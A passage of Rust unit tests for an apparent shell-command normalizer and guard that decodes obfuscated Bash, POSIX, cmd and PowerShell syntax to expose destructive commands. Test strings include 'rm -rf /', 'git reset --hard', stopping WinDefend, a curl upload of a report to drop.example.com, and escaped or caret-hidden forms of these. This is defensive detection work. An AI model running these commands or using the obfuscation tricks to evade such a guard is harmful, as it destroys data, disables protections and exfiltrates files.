            "(( x = 1 )) # git reset --hard",
            // A `#` after a word byte starts no comment to any reader.
            "(( x = 2#101 )); echo $(( $# + ${#x} ))",
            // Bash reads `#` after a blank as a comment in `[[ … ]]` outside
            // a regex group, and in `$((…))`.
            "[[ a == a #]]; git reset --hard",
            "[[ x =~ a #) ]]; git reset --hard",
            "[[ x =~ ( a ) #]]; git reset --hard",
            "[[ ( x =~ y ) #]]; git reset --hard",
            "echo =~ ( #)",
            "echo $(( 1 #)); git reset --hard",
            // Not an arithmetic command: nested subshells, quoted text, a
            // comment, or parentheses inside a word.
            "((cd x) #it's\n)",
            "echo '(( 1 #))'",
            "echo \"(( 1 #))\"",
            "# (( 1 #))",
            "",
            // A `\`LF pair that ends a comment, or whose `\` is escaped, is
            // no line continuation: the next line starts with a comment.
            ": # it's \\\n# (( 1 #))",
            ": \\\\\n# (( 1 #))",
            // Only a pattern group keeps a `#` from starting a comment.
            "[[ x == @(a|b) ]] && echo ok # git reset --hard",
            "[[ x == a #]]; git reset --hard",
            "arr=(a # it's\nb); git status",
            // A `${…}` holds no command, so no group, arithmetic or comment.
            "echo ${x:+(}; : # it's (( 1 #))",
            "echo ${x:-((}; : # it's (( 1 #))",
            // A command substitution in a span with no comment in it.
            "[[ x == $(echo x) ]] && echo ok # git reset --hard",
            "(( $(echo 1) > 0 )) && echo ok # git reset --hard",
            "[[ x == \"$(echo '#')\" ]] && echo ok # git reset --hard",
        ] {
            assert_eq!(bash_spelling(command), None, "{command:?}");
        }
    }

    /// Bash ends a `${` at its first `}` (only a nested `${` nests) and reads
    /// `$$` as one parameter.
    #[test]
    fn bash_parameter_expansions_end_where_bash_ends_them() {
        for (command, spelled) in [
            (
                "echo ${x:-{}; (( 1 #)); git reset --hard",
                "echo ${x:-{}; (( 1 _)); git reset --hard",
            ),
            (
                "echo ${x:-${y:-{}}; (( 1 #)); git reset --hard",
                "echo ${x:-${y:-{}}; (( 1 _)); git reset --hard",
            ),
            (
                "echo $${ ; (( 1 #)); git reset --hard",
                "echo $${ ; (( 1 _)); git reset --hard",
            ),
            // A Bash 5.3 `${ …; }` is read as the shared readers read it: to
            // its first `}`.
            (
                "echo \"${ (echo) }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ (echo) }; : # \"; (( 1 _)); git reset --hard",
            ),
            (
                "echo \"${ { :; } }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ { :; } }; : # \"; (( 1 _)); git reset --hard",
            ),
            (
                "echo \"${ if :; then :; fi }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ if :; then :; fi }; : # \"; (( 1 _)); git reset --hard",
            ),
            (
                "echo \"${ for x in 1; do :; done }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ for x in 1; do :; done }; : # \"; (( 1 _)); git reset --hard",
            ),
            (
                "echo \"${ case x in x) ;; esac }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ case x in x) ;; esac }; : # \"; (( 1 _)); git reset --hard",
            ),
            (
                "echo \"${ [[ x ]] }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ [[ x ]] }; : # \"; (( 1 _)); git reset --hard",
            ),
            (
                "echo \"${ (( 1 )) }; : # \"; (( 1 #)); git reset --hard",
                "echo \"${ (( 1 )) }; : # \"; (( 1 _)); git reset --hard",
            ),
            // A quote in a heredoc body opens nothing.
            (
                "cat <<'EOF'\ndon't\nEOF\n(( 1 #)); git reset --hard",
                "cat <<'EOF'\ndon't\nEOF\n(( 1 _)); git reset --hard",
            ),
            (
                "cat <<EOF\nsay \"hi\nEOF\n(( 1 #)); git reset --hard",
                "cat <<EOF\nsay \"hi\nEOF\n(( 1 _)); git reset --hard",
            ),
        ] {
            assert_eq!(
                bash_spelling(command).as_deref(),
                Some(spelled),
                "{command:?}"
            );
        }
    }

    /// A comment in a command substitution inside a span this reading spells
    /// leaves the span without a reading: its quotes would open in the
    /// spelling and hide what follows.
    #[test]
    fn bash_substitution_comments_in_spans_are_unread() {
        let tail = "(( 1 #)); git reset --hard\n# \" ) ]]";
        for command in [
            format!("[[ x == $( : # \"\n) ]]; {tail}"),
            format!("[[ x == $( : # '\n) ]]; {tail}"),
            format!("[[ x != $( : # \"\n) ]] || {tail}"),
            format!("[[ x =~ $( : # \"\n) ]]; {tail}"),
            format!("[[ x = @( $( : # \"\n) ) ]]; {tail}"),
            format!("[[ x == \"$( : # \"\n)\" ]]; {tail}"),
            format!("[[ x == `: # \"` ]]; {tail}"),
            format!("for (( i=$( : # \"\n) ; i<1; i++ )); do :; done; {tail}"),
            format!("(( i=$( : # ) )\n) + 1 #)); {tail}"),
            format!("(( `: # \"` + 1 )); {tail}"),
            format!("echo $(( $( : # \"\n) )); {tail}"),
            // Both `(` of a `$((` count, and `$'…'` is quoted text.
            format!("(( i = $( echo $(( 1 )) # \"\n) + 1 )); {tail}"),
            format!("for (( i=$( echo $(( 1 )) # '\n) ; i<1; i++ )); do :; done; {tail}"),
            format!("for (( i=$( : $((1)) # \"\n) ; i<1; i++ )); do :; done; {tail}"),
            format!("[[ x == $( echo $(( 1 )) # \"\n) ]]; {tail}"),
            format!("[[ x == $( : $'\\'' # \"\n) ]]; {tail}"),
            format!("(( $(cat <( : # \"\n)) )); {tail}"),
            "[[ x == $( : # it's\n) ]]; git status".to_string(),
        ] {
            assert_eq!(
                bash_hashes_as_data(&command, false),
                Some(BashHashReading::Unread),
                "{command:?}"
            );
        }
        // A `#` after the substitution has closed is read as before.
        assert_eq!(
            bash_spelling("(( $(f) + 1 #)); git reset --hard").as_deref(),
            Some("(( $(f) + 1 _)); git reset --hard")
        );
    }

    /// `$$` is one parameter, so a `{` after it opens nothing and is spelled;
    /// a Bash 5.3 `${ …; }` and a `'` that ends a double-quoted `${…}` at
    /// another place for Bash than for dash have no reading.
    #[test]
    fn bash_bracket_words_spell_blanks_bash_reads_in_one_word() {
        let spelled = |command: &str| match bash_bracket_words(command) {
            Some(BashHashReading::Spelled(spelled)) => spelled,
            other => panic!("{command:?}: {other:?}"),
        };
        assert_eq!(
            spelled("x=$[1 + 2] git reset --hard"),
            "x=$[1_+_2] git reset --hard"
        );
        assert_eq!(
            spelled("x[1 + 1]=a git reset --hard"),
            "x[1_+_1]=a git reset --hard"
        );
        assert_eq!(spelled("x[$i + 1]+=a git"), "x[$i_+_1]+=a git");
        assert_eq!(
            spelled("x=$[ a[1] + \"b c\" ] git"),
            "x=$[_a[1]_+_\"b c\"_] git"
        );
        for unchanged in [
            "x=$[1+2] git reset --hard",
            "echo x[1 + 1]",
            "echo '$[1 + 2]'",
            "echo \"$[1 + 2]\"",
            "x=$[1 +\n 2] git",
            "[ -f x ] && echo ok",
            "echo [a b]=c",
        ] {
            assert_eq!(bash_bracket_words(unchanged), None, "{unchanged:?}");
        }
        assert_eq!(bash_bracket_words("git status"), None);
    }

    #[test]
    fn substitution_bodies_read_comments_and_case_patterns_as_command_text() {
        let end = |command: &str| {
            let start = command.find("$(").expect("opener") + 2;
            consume_shell_paren_construct(command.as_bytes(), start, command.len())
        };
        let command = "x=$(echo a # )\n) printf";
        assert_eq!(&command[..end(command)], "x=$(echo a # )\n)");
        let command = "x=$(case a in a) echo a b;; esac) printf";
        assert_eq!(
            &command[..end(command)],
            "x=$(case a in a) echo a b;; esac)"
        );
        let command = "x=$(case a in (a) :;; b|c) :;& *) :;;& esac) printf";
        assert_eq!(
            &command[..end(command)],
            "x=$(case a in (a) :;; b|c) :;& *) :;;& esac)"
        );
        // A word that only spells `case`, a `#` inside a word, an arithmetic
        // body and a heredoc body hold nothing open.
        for (command, through) in [
            ("x=$(echo case a in a) git", "x=$(echo case a in a)"),
            ("x=$(echo a#b) git", "x=$(echo a#b)"),
            ("x=$((1 # 2)) git", "x=$((1 # 2))"),
            (
                "x=$(cat <<EOF\ncase a in\nEOF\n); git",
                "x=$(cat <<EOF\ncase a in\nEOF\n)",
            ),
        ] {
            assert_eq!(&command[..end(command)], through, "{command:?}");
        }
    }

    #[test]
    fn posix_simple_command_words_keep_expansions_whole() {
        assert_eq!(
            posix_simple_command_words("x=${y:- a} alias p='bash -s'").expect("words"),
            ["x=${y:- a}", "alias", "p=bash -s"]
        );
        assert_eq!(
            posix_simple_command_words("x=$(echo a b) \"c d\" e").expect("words"),
            ["x=$(echo a b)", "c d", "e"]
        );
        assert!(posix_simple_command_words("echo 'a").is_err());
    }

    #[test]
    fn bash_parameter_openers_reads_dollar_pairs_funsubs_and_quote_disputes() {
        let spelled = |command: &str| match bash_parameter_openers(command) {
            Some(BashHashReading::Spelled(spelled)) => Some(spelled),
            other => panic!("{command:?}: {other:?}"),
        };
        assert_eq!(
            spelled("echo $${ ; git reset --hard").as_deref(),
            Some("echo $$_ ; git reset --hard")
        );
        assert_eq!(
            spelled("echo $\\\n${ ; git reset --hard").as_deref(),
            Some("echo $\\\n$_ ; git reset --hard")
        );
        assert_eq!(
            spelled("echo $$$${x}; ${y:-$${z}}").as_deref(),
            Some("echo $$$$_x}; ${y:-$$_z}}")
        );
        for command in [
            "echo $${x}",
            "echo $$ {x}",
            "echo ${x:-a b}",
            "echo \\${ x }",
            "echo $$${x}",
            "x=${y:- a} git reset --hard",
            "echo \"${y:-'a'}\"",
            "echo \"${y:-\"'}\"}\"",
            "echo ${x",
            "git status",
        ] {
            assert!(
                !matches!(
                    bash_parameter_openers(command),
                    Some(BashHashReading::Unread)
                ),
                "{command:?}"
            );
        }
        assert_eq!(bash_parameter_openers("echo $$ {x}"), None);
        // A body with a quoted delimiter is raw text to every shell.
        assert_eq!(
            bash_parameter_openers("cat <<'EOF'\n${ git reset --hard; }\nEOF\ngit status"),
            None
        );
        assert_eq!(spelled("echo $${x}").as_deref(), Some("echo $$_x}"));
        assert_eq!(
            spelled("echo \"$${HOME}\"; git status").as_deref(),
            Some("echo \"$$_HOME}\"; git status")
        );
        assert_eq!(bash_parameter_openers("echo \"${y:-'a'}\""), None);
        for command in [
            "echo ${ : # \"\n}; git reset --hard\n# \"",
            "echo \"${ : # \"\n}\"; git reset --hard\n# \"",
            "echo ${| : # \"\n}; git reset --hard\n# \"",
            "echo ${ git reset --hard; }",
            "echo ${\tgit reset --hard; }",
            "echo ${\ngit reset --hard\n}",
            "echo ${|git reset --hard; }",
            "echo ${\\\n git reset --hard; }",
            "echo \\$${ git reset --hard; }",
            "echo $$${ git reset --hard; }",
            "echo \"${y:-'}\" #'}\"; git reset --hard",
            "echo \"${y:-'}\" #'}\" && git push --force origin main",
            "echo \"${y#'}\"; git reset --hard; : '}\"",
            // A line continuation between `$` and `{` hides no dispute.
            "echo \"$\\\n{y:-'}\" #'}\"; git reset --hard",
            "echo \"$\\\n{y:-'}\" #'}\" && git push --force origin main",
            "echo \"$\\\n\\\n{y:-'}\" #'}\"; git reset --hard",
            "x=\"$\\\n{y:-'}\" #'}\"; git reset --hard",
            "echo ${y:-$\\\n{z}} #}; git reset --hard",
            // Bash 3.2 reads the `${` at the second `$` of `$$` in this
            // dispute, also behind a line continuation.
            "echo \"$${y:-'}\" #'}\"; git reset --hard",
            "echo \"$${y:-'}\" #'}\" && git push --force origin main",
            "x=\"$${y:-'}\" #'}\"; git reset --hard",
            "echo \"$$\\\n{y:-'}\" #'}\"; git reset --hard",
            "cat <<EOF\n${ git reset --hard; }\nEOF",
            "cat <<'EOF'\nEOF\necho ${ git reset --hard; }",
        ] {
            assert_eq!(
                bash_parameter_openers(command),
                Some(BashHashReading::Unread),
                "{command:?}"
            );
        }
        // A run of nested unclosed `${` is read once, and both readings
        // agree on it; a dispute after it is still found.
        for body in ["${".repeat(30_000), "echo ${x ".repeat(8_000)] {
            let started = std::time::Instant::now();
            let command = format!("cat <<'EOF' > notes.txt\n{body}\nEOF\ngit status");
            assert_eq!(bash_parameter_openers(&command), None);
            let command = format!("{body}\necho \"${{y:-'}}\" #'}}\"; git reset --hard");
            assert_eq!(
                bash_parameter_openers(&command),
                Some(BashHashReading::Unread)
            );
            assert!(started.elapsed() < std::time::Duration::from_secs(2));
        }
        // Lookups that share fewer reads stay within the budget's time.
        for unit in ["'${'", "\"${\"", "x\"${\"'", "\"$${'"] {
            let started = std::time::Instant::now();
            let _ = bash_parameter_openers(&unit.repeat(8_000));
            assert!(started.elapsed() < std::time::Duration::from_secs(2));
        }
    }

    /// The spelling of [`bash_hashes_as_data`]; it must read the command.
    fn bash_spelling(command: &str) -> Option<String> {
        match bash_hashes_as_data(command, false) {
            None => None,
            Some(BashHashReading::Spelled(spelled)) => Some(spelled),
            Some(BashHashReading::Unread) => panic!("unread: {command:?}"),
        }
    }

    /// Each `#` at a token start in an open paren or right after a `)` is
    /// spelled; a comment after a blank outside parens and a `#` after a
    /// word byte are not.
    #[test]
    fn paren_hashes_as_data_spells_hashes_in_and_after_parens() {
        for (command, spelled) in [
            (
                "(true)#it's\ngit reset --hard",
                Some("(true)_it's\ngit reset --hard"),
            ),
            ("ls (a|(b)#); x", Some("ls (a|(b)_); x")),
            ("ls ( #); x", Some("ls ( _); x")),
            (
                "case x in # c\n(#) ;; esac",
                Some("case x in # c\n(_) ;; esac"),
            ),
            ("(true)\\\n#; x", Some("(true)\\\n_; x")),
            // A quote in a comment does not stop the count.
            ("( # it's\n) ; ls (#)", Some("( _ it's\n) ; ls (_)")),
            ("echo $(date) # x", None),
            ("(true) # x", None),
            ("echo $((2#1)) $# ${#x}", None),
            ("# (x)\nls", None),
            ("ls # x", None),
            // A heredoc body is raw text.
            ("cat <<'EOF'\n(\n#\nEOF\n# x", None),
        ] {
            assert_eq!(
                paren_hashes_as_data(command).as_deref(),
                spelled,
                "{command:?}"
            );
        }
    }

    /// A `!(…)` outside `[[ … ]]` is a group only once `extglob` is on;
    /// with it off, it is a negated subshell, where `#` starts a comment.
    #[test]
    fn bash_negation_groups_are_read_only_with_extglob() {
        let command = ": !( #); git reset --hard";
        assert_eq!(bash_hashes_as_data(command, false), None);
        assert_eq!(
            bash_hashes_as_data(command, true),
            Some(BashHashReading::Spelled(
                ": !( _); git reset --hard".to_string()
            ))
        );
        let command = "[[ x != !( #) ]] || git reset --hard";
        assert_eq!(
            bash_hashes_as_data(command, false),
            bash_hashes_as_data(command, true)
        );
    }

    #[test]
    fn bash_hashes_as_data_is_linear_on_unclosed_parentheses() {
        let start = std::time::Instant::now();
        for command in [
            format!("{} #)); git reset --hard", "(".repeat(60_000)),
            format!("{} #", "$((".repeat(20_000)),
            format!("{} #", "((".repeat(30_000)),
            format!("{} #", "@(".repeat(30_000)),
            format!("{} #", "x\\\n".repeat(30_000)),
            format!("{} #", "[\\\n".repeat(30_000)),
            format!("[[ {} #", "= x".repeat(30_000)),
            format!("{}\n#", "\\".repeat(60_000)),
        ] {
            let _ = bash_hashes_as_data(&command, true);
        }
        assert!(
            start.elapsed() < std::time::Duration::from_secs(3),
            "{:?}",
            start.elapsed()
        );
    }

    #[test]
    fn bash_hashes_as_data_reads_nested_parentheses_exactly() {
        let tail = " (( 1 #)); git reset --hard";
        // A run of nested or unclosed `(` costs one scan: a real comment
        // after it stays a comment, and the arithmetic `#` is spelled.
        for head in [
            format!("{}true{}", "(".repeat(140), ") ".repeat(140)),
            format!("{}true{}", "(".repeat(5_000), ") ".repeat(5_000)),
            "(".repeat(5_000),
            "@(".repeat(5_000),
            "((true) );".repeat(2_000),
        ] {
            let command = format!("{head};: # \"\n{tail}\n# \"");
            let spelled = bash_spelling(&command).expect("spelled");
            assert!(
                spelled.ends_with(";: # \"\n (( 1 _)); git reset --hard\n# \""),
                "{head:.9}"
            );
        }
        // An unclosed `$((` reads to the end as a command substitution, so
        // the comment in it fails closed. Bash: unexpected end of file.
        let command = format!("{};: # \"\n{tail}\n# \"", "$((".repeat(2_000));
        assert_eq!(
            bash_hashes_as_data(&command, false),
            Some(BashHashReading::Unread)
        );
    }

    #[test]
    fn bash_hashes_as_data_reads_nothing_past_its_budget() {
        let command = "(( 1 #)); (( 2 #)); git reset --hard";
        assert_eq!(
            bash_hashes_as_data_within(command, false, 0),
            Some(BashHashReading::Unread)
        );
        assert_eq!(
            bash_hashes_as_data_within(command, false, 64),
            Some(BashHashReading::Spelled(
                "(( 1 _)); (( 2 _)); git reset --hard".to_string()
            ))
        );
        // Quoted text that each lookup starts inside of is read once. The
        // unclosed `$(` holds the comment-capable `#`, so the reading fails
        // closed. Bash: unexpected end of file.
        let command = format!("(({} #)); git reset --hard", "\"$(((".repeat(3_000));
        let start = std::time::Instant::now();
        assert_eq!(
            bash_hashes_as_data(&command, false),
            Some(BashHashReading::Unread)
        );
        assert!(
            start.elapsed() < std::time::Duration::from_secs(3),
            "{:?}",
            start.elapsed()
        );
    }

    #[test]
    fn test_sudo_simple() {
        let result = strip_wrapper_prefixes("sudo git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
        assert_eq!(result.stripped_wrappers.len(), 1);
        assert_eq!(result.stripped_wrappers[0].wrapper_type, "sudo");
    }

    #[test]
    fn test_sudo_with_options() {
        let result = strip_wrapper_prefixes("sudo -E -H git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_sudo_with_combined_options() {
        let result = strip_wrapper_prefixes("sudo -EH git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_sudo_with_user() {
        let result = strip_wrapper_prefixes("sudo -u root git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_sudo_unknown_flag_does_not_strip() {
        let result = strip_wrapper_prefixes("sudo -l rm -rf /");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_sudo_unknown_long_flag_does_not_strip() {
        let result = strip_wrapper_prefixes("sudo --list rm -rf /");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_tokenize_for_normalization_treats_newline_as_separator() {
        let cmd = "echo ok\nrm -rf /";
        let tokens = tokenize_for_normalization(cmd);

        let newline_token = tokens
            .iter()
            .find(|tok| tok.kind == NormalizeTokenKind::Separator && tok.text(cmd) == Some("\n"));
        assert!(newline_token.is_some(), "Expected newline separator token");
    }

    #[test]
    fn shell_decoder_preserves_unknown_syntax() {
        let syntax_tokens = [r"g\it", r#""g\it""#, r"'g\it'", r"--d\elete"];

        let mut decoder = ShellTokenDecoder::new(ShellDialect::Unknown);
        for token in syntax_tokens {
            assert_eq!(
                decoder.decode(token, ShellTokenRole::Syntax).as_deref(),
                Some(token),
                "unknown shell syntax must remain byte-preserving"
            );
        }
    }

    #[test]
    fn posix_decoder_handles_quote_concatenation_and_bash_ansi_c_options() {
        let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
        let cases = [
            (r"g\it", "git"),
            ("g'i't", "git"),
            (r#""g"it"#, "git"),
            ("$'-d'", "-d"),
            ("-$'d'", "-d"),
            ("$'--delete'", "--delete"),
            ("--$'delete'", "--delete"),
            ("g$'i't", "git"),
            (r"$'\x2d\x64'", "-d"),
            (r"$'\055d'", "-d"),
            (r"$'\0123'", "\n3"),
            (r"$'\u002d\u0064'", "-d"),
            (r"$'\x72\x6d\x00ignored'", "rm"),
            (r"$'\x72\x6d\c@ignored'", "rm"),
            (r#"$"-d""#, "-d"),
            (r#"$"--delete""#, "--delete"),
            // An overlong octal escape keeps its low byte, as bash and zsh
            // do: 0o562 & 0xff is `r`, and 0o400 is NUL (ends the string).
            (r"$'\562m'", "rm"),
            (r"$'-\562f'", "-rf"),
            (r"$'rm\400ignored'", "rm"),
        ];

        for (raw, expected) in cases {
            assert_eq!(
                decoder.decode(raw, ShellTokenRole::Syntax).as_deref(),
                Some(expected),
                "POSIX syntax token {raw:?}"
            );
        }
    }

    #[test]
    fn posix_command_normalization_decodes_ansi_c_executables_but_not_data() {
        let destructive = [
            (r"$'\x72\x6d' -rf /", "rm -rf /"),
            (r"$'\x72\x6d\0ignored' -rf /", "rm -rf /"),
            (r"$'\162\155' -rf /", "rm -rf /"),
            (r"$'\u0072\u006d' -rf /", "rm -rf /"),
            (
                r"$'\x64\x6f\x63\x6b\x65\x72' system prune -af",
                "docker system prune -af",
            ),
            (
                r"$'\x64\x6f\x63\x6b\x65\x72\x00ignored' system prune -af",
                "docker system prune -af",
            ),
            (r"sudo $'\x72\x6d' -rf /", "rm -rf /"),
            (r"echo ok; $'\x72\x6d' -rf /", "echo ok; rm -rf /"),
        ];
        for (raw, expected) in destructive {
            for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
                assert_eq!(
                    normalize_command_in_dialect(raw, dialect),
                    expected,
                    "ANSI-C command syntax for {dialect:?}: {raw:?}"
                );
            }
        }

        let inert_data = r"echo $'\x72\x6d -rf /'";
        for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
            assert_eq!(
                normalize_command_in_dialect(inert_data, dialect),
                inert_data,
                "ANSI-C text passed as an argument must remain inert for {dialect:?}"
            );
        }
    }

    #[test]
    fn cmd_command_normalization_decodes_caret_escaped_argv_without_inventing_structure() {
        let commands = [
            (
                "b^lat.exe body.txt -to outside@example.com",
                "blat body.txt -to outside@example.com",
            ),
            (
                r"echo ready & c^url.exe -T C:\report.csv https://example.com/ingest",
                r"echo ready & curl -T C:\report.csv https://example.com/ingest",
            ),
            (
                r"curl.exe -^T C:\report.csv https://dr^op.example.com/ingest",
                r"curl -T C:\report.csv https://drop.example.com/ingest",
            ),
            (
                r"ssh.exe -^R 8080:localhost:80 user@relay.example.com -N",
                r"ssh -R 8080:localhost:80 user@relay.example.com -N",
            ),
            (
                r#"curl.exe ^"-T^" C:\report.csv https://drop.example.com/ingest"#,
                r"curl -T C:\report.csv https://drop.example.com/ingest",
            ),
            (r"sc.exe st^op WinDefend", r"sc stop WinDefend"),
            (
                "\\\\server\\share\\b^lat.exe body.txt -to outside@example.com",
                "blat body.txt -to outside@example.com",
            ),
            (
                r".\b^lat.exe body.txt -to outside@example.com",
                "blat body.txt -to outside@example.com",
            ),
            (
                r"..\tools\b^lat.exe body.txt -to outside@example.com",
                "blat body.txt -to outside@example.com",
            ),
        ];
        for (raw, expected) in commands {
            assert_eq!(
                normalize_command_in_dialect(raw, ShellDialect::Cmd),
                expected,
                "Cmd executable syntax: {raw:?}"
            );
        }

        let structural_data = [
            "echo ^& c^url.exe -^T report.csv",
            "echo ^| s^c.exe st^op WinDefend",
            "echo ^> C:\\report.txt",
            "echo \"c^url.exe -^T report.csv\"",
            "FOO=bar c^url.exe -^T report.csv",
            "echo safe ^^& c^url.exe -^T report.csv",
            "sc.exe 'st^op' WinDefend",
        ];
        let structural_expected = [
            "echo ^& curl.exe -T report.csv",
            "echo ^| sc.exe stop WinDefend",
            "echo ^> C:\\report.txt",
            "echo \"c^url.exe -^T report.csv\"",
            "FOO=bar c^url.exe -^T report.csv",
            "echo safe ^^& curl -T report.csv",
            "sc 'stop' WinDefend",
        ];
        for (raw, expected) in structural_data.into_iter().zip(structural_expected) {
            assert_eq!(
                normalize_command_in_dialect(raw, ShellDialect::Cmd),
                expected,
                "Cmd normalization must reveal argv without inventing shell structure: {raw:?}"
            );
        }
        assert_eq!(
            normalize_command_in_dialect("b^lat.exe body.txt", ShellDialect::PowerShell),
            "b^lat body.txt",
            "a caret must remain data outside a proven Cmd dialect"
        );
    }

    #[test]
    #[allow(clippy::literal_string_with_formatting_args)]
    fn posix_parameter_word_readings_give_unset_and_set_argv() {
        const V: &str = POSIX_PARAMETER_VALUE;
        let read = posix_parameter_word_readings;
        let fields = |items: &[&str]| items.iter().map(ToString::to_string).collect::<Vec<_>>();
        // Default operands split on blanks; quotes inside them hold.
        assert_eq!(
            read("${X:--rf /tmp/zz}"),
            Some([fields(&["-rf", "/tmp/zz"]), fields(&[V])])
        );
        assert_eq!(
            read("${X:-. -\"W\"$Z}"),
            Some([fields(&[".", "-W"]), fields(&[V])])
        );
        assert_eq!(
            read("${X:-. \"a\nb\" -W}"),
            Some([fields(&[".", "a\nb", "-W"]), fields(&[V])])
        );
        // Partial words.
        assert_eq!(
            read("-${Y}W"),
            Some([fields(&["-W"]), fields(&[&format!("-{V}W")])])
        );
        assert_eq!(
            read("${Y:--}W"),
            Some([fields(&["-W"]), fields(&[&format!("{V}W")])])
        );
        assert_eq!(read("\"\"${Y:--W}"), Some([fields(&["-W"]), fields(&[V])]));
        assert_eq!(
            read("${X:+.}${Y:--W}"),
            Some([fields(&["-W"]), fields(&[&format!(".{V}")])])
        );
        // Alternate values appear only when set; quoted words do not split.
        assert_eq!(
            read("${X:+--force}"),
            Some([fields(&[]), fields(&["--force"])])
        );
        assert_eq!(
            read("\"${X:---hard}\""),
            Some([fields(&["--hard"]), fields(&[V])])
        );
        assert_eq!(
            read("\"${X:-a b}\""),
            Some([fields(&["a b"]), fields(&[V])])
        );
        assert_eq!(read("\"$X\""), Some([fields(&[""]), fields(&[V])]));
        assert_eq!(read("$FILES"), Some([fields(&[]), fields(&[V])]));
        // Always-set special parameters and lengths are one unknown value.
        assert_eq!(read("$?"), Some([fields(&[V]), fields(&[V])]));
        assert_eq!(read("${#X}"), Some([fields(&[V]), fields(&[V])]));
        // A failing `${X:?}` runs nothing when X is unset.
        assert_eq!(read("${X:?}"), Some([fields(&[]), fields(&[V])]));
        // A quoted command substitution is one field of unknown text.
        assert_eq!(read("\"$(pwd)\""), Some([fields(&[V]), fields(&[V])]));
        assert_eq!(
            read("\"$(git rev-parse \"x)\")/build\""),
            Some([
                fields(&[&format!("{V}/build")]),
                fields(&[&format!("{V}/build")])
            ])
        );
        assert_eq!(read("\"`pwd`\""), Some([fields(&[V]), fields(&[V])]));
        assert_eq!(
            read("\"${ROOT:-$(pwd)}\""),
            Some([fields(&[V]), fields(&[V])])
        );
        // No reading for unquoted command substitution, arithmetic or bad
        // quoting.
        assert_eq!(read("$(echo -W)"), None);
        assert_eq!(read("${X:-$(echo -W)}"), None);
        assert_eq!(read("`echo -W`"), None);
        assert_eq!(read("$((1+2))"), None);
        assert_eq!(read("${X:-'a}"), None);
        assert_eq!(read("${}"), None);
    }

    #[test]
    fn posix_reading_choices_mix_words_up_to_the_bound() {
        let word = |unset: &str, set: &str| [unset.to_string(), set.to_string()];
        let fixed = word("rm", "rm");
        let (choices, complete) =
            posix_reading_choices(&[fixed.clone(), word("-rf", "V"), word("", "V")]);
        assert!(complete);
        assert_eq!(
            choices,
            vec![vec![0, 0, 0], vec![1, 1, 1], vec![0, 1, 0], vec![0, 0, 1]]
        );
        assert_eq!(
            posix_reading_choices(std::slice::from_ref(&fixed)).0,
            vec![vec![0]]
        );
        let many = vec![word("", "V"); MAX_MIXED_READING_WORDS];
        assert_eq!(
            posix_reading_choices(&many).0.len(),
            1 << MAX_MIXED_READING_WORDS
        );
        let too_many = vec![word("", "V"); MAX_MIXED_READING_WORDS + 1];
        let (choices, complete) = posix_reading_choices(&too_many);
        assert!(!complete);
        assert_eq!(choices.len(), 2);
    }

    #[test]
    fn posix_decoder_preserves_data_and_unresolved_expansions() {
        let data_tokens = [
            "$'-d'",
            "-$'d'",
            "$'--delete'",
            "--$'delete'",
            "g$'i't",
            r"$'\x2d\x64'",
            r#"$"--delete""#,
        ];
        let mut decoder = ShellTokenDecoder::new(ShellDialect::Posix);
        for token in data_tokens {
            assert_eq!(
                decoder.decode(token, ShellTokenRole::Data).as_deref(),
                Some(token),
                "POSIX data token must remain byte-preserving"
            );
        }

        for dynamic in [
            "$branch",
            "${branch}",
            "$(printf -- -d)",
            "`printf -- -d`",
            r#"$"-$branch""#,
        ] {
            assert_eq!(
                decoder.decode(dynamic, ShellTokenRole::Syntax).as_deref(),
                Some(dynamic),
                "unresolved expansion must fail open: {dynamic:?}"
            );
        }
    }

    #[test]
    fn shell_dialect_tokenizer_delegates_posix_and_unknown_unchanged() {
        let command = "git branch --format\\ -d && echo ok\nnext";
        let baseline: Vec<_> = tokenize_for_normalization(command)
            .iter()
            .map(|token| {
                (
                    token.kind,
                    token
                        .text(command)
                        .expect("baseline token must slice source")
                        .to_string(),
                )
            })
            .collect();

        for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
            assert_eq!(raw_token_snapshot(command, dialect), baseline);
        }
    }

    #[test]
    fn powershell_raw_tokenizer_keeps_escaped_syntax_inside_words() {
        let command = "g`it branch --de`\r\nlete feature` name foo`;bar ; echo";
        assert_eq!(
            raw_token_snapshot(command, ShellDialect::PowerShell),
            vec![
                (NormalizeTokenKind::Word, "g`it".to_string()),
                (NormalizeTokenKind::Word, "branch".to_string()),
                (NormalizeTokenKind::Word, "--de`\r\nlete".to_string()),
                (NormalizeTokenKind::Word, "feature` name".to_string()),
                (NormalizeTokenKind::Word, "foo`;bar".to_string()),
                (NormalizeTokenKind::Separator, ";".to_string()),
                (NormalizeTokenKind::Word, "echo".to_string()),
            ]
        );

        let boundary_continuations = "& `\r\n $first; . `\n $second";
        assert_eq!(
            raw_token_snapshot(boundary_continuations, ShellDialect::PowerShell),
            vec![
                (NormalizeTokenKind::Separator, "&".to_string()),
                (NormalizeTokenKind::Word, "$first".to_string()),
                (NormalizeTokenKind::Separator, ";".to_string()),
                (NormalizeTokenKind::Word, ".".to_string()),
                (NormalizeTokenKind::Word, "$second".to_string()),
            ]
        );
    }

    #[test]
    fn powershell_raw_tokenizer_splits_words_on_every_unicode_space() {
        let words = |command: &str| -> Vec<String> {
            raw_token_snapshot(command, ShellDialect::PowerShell)
                .into_iter()
                .map(|(_, text)| text)
                .collect()
        };
        // PowerShell 7.5 splits on each of these (measured); the word
        // reader must too, between words and before the first one.
        for space in [
            '\u{b}', '\u{c}', '\u{85}', '\u{a0}', '\u{1680}', '\u{2000}', '\u{2003}', '\u{200a}',
            '\u{2028}', '\u{2029}', '\u{202f}', '\u{205f}', '\u{3000}',
        ] {
            let command = format!("{space}git{space}reset{space}{space}--hard{space}");
            assert_eq!(words(&command), ["git", "reset", "--hard"], "{space:?}");
